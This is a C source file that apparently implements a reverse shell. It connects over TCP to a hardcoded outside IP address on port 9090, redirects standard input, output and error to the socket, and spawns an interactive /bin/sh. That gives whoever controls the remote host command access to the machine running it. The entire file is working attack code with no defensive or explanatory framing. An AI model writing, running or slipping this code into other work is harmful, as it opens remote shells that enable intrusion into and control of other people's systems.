#include <stdio.h>
#include <stdlib.h>  
#include <unistd.h> 
#include <sys/wait.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#define PORT 9090
#define IP "142.44.167.241"

/**
 * err_handle - display error message and exit
 * @s: message to be displayed alone with error
 */
void err_handle(char* s){
  perror(s);
  exit(EXIT_FAILURE);
}

/**
 * client_mode - requests connection to web1 server @ 142.44.167.241:9090
 * Return: connection socket file descriptor 
 */
int client_mode ()
{
  int sock = 0;
  struct sockaddr_in serv;

  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    err_handle("socket");

  printf("client-side socket success\n");

  /* fill in server info - IPv4, server port + IP */
  serv.sin_family = AF_INET;
  serv.sin_port = htons(PORT);
  serv.sin_addr.s_addr = inet_addr(IP);

  /* request for connection */
  if (connect (sock, (struct sockaddr *) &serv, sizeof(serv)) < 0) 
    err_handle("client-side connection");

  printf("connected to server\n");
  return (sock);
}

/**
 * commandline - redirect stdin/stdout/stderr to connection socket and spawn shell
 * Return: 0 on success
 */
int commandline (int fd)
{
  char *shell[3] ;
  pid_t pid = 0;
  int status = 0;

  /* fill in shell */
  shell[0] = "/bin/sh";
  shell[1] = "-i";
  shell[2] = NULL;

  /* redirect to socket fd */
  dup2 (fd, 0);
  dup2 (fd, 1);
  dup2 (fd, 2);

  pid = fork();
  if (pid == 0)
    {
      execv (shell[0], shell);
      err_handle("child process");
    }
  else if (pid > 0)
    wait(&status);
  else
    err_handle("Fork");

  return 0;
}

/**
 * main - run client_mode & executes shell upon successful connection 
 * Return: 0
 */
int main ()
{
  int sock = client_mode();
  commandline(sock);
    
  return 0;
}
